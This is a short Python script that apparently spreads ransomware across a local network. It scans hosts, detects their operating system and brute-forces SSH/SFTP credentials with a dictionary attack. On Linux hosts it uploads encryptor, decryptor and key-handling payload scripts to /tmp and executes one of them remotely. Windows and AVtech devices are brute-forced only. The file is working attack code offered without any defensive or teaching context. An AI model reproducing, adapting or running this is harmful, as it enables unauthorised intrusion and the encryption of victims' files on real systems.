from get_ip import getIP
from get_os import getos
from colorama import init, Fore, Back, Style
from termcolor import colored
import pysftp as sftp
import dict_attack


ips = getIP()
ips.remove('10.0.2.9')
for ip in ips:
    try:
        os = getos(ip)
        print(colored(Fore.GREEN + ip + ' --> '+ os))
        if os == 'Linux':
            try:
                print(colored(Fore.YELLOW + 'Trying Brute Force'))
                handle = dict_attack.attack(ip)
                handle.makedirs('/tmp/IMP')
                handle.put('/home/kali/Desktop/Mongolian/linuxPayload.py','/tmp/IMP/linuxPayload.py')
                handle.put('/home/kali/Desktop/Mongolian/linuxFileDecryptor.py', '/tmp/IMP/linuxFileDecryptor.py')
                handle.put('/home/kali/Desktop/Mongolian/linuxKeyFileEncryptor.py' , '/tmp/IMP/linuxKeyFileEncryptor.py')
                handle.put('/home/kali/Desktop/Mongolian/linuxKeyFileDecryptor.py' , '/tmp/IMP/linuxKeyFileDecryptor.py')
                handle.put('/home/kali/Desktop/Mongolian/linuxFileDecryptor.py', '/tmp/IMP/linuxFielDecryptor.py')
                handle.put('/home/kali/Desktop/Mongolian/le.py', '/tmp/IMP/le.py')
                handle.put('/home/kali/Desktop/Mongolian/ld.py', '/tmp/IMP/ld.py')
                handle.execute('python3 /tmp/IMP/le.py')
            except:
                print(colored(Fore.YELLOW + '[-] Skipping ' + ip))
        elif os == 'AVtech' or os == 'Microsoft':
            try:
                print(colored(Fore.YELLOW + 'Trying Brute Force'))
                handle = dict_attack.attack(ip)
            except:
                print(colored(Fore.YELLOW + '[-]Skipping ' + ip))
            pass

    except:
        print(colored(Fore.RED + 'Failed for ' + ip))
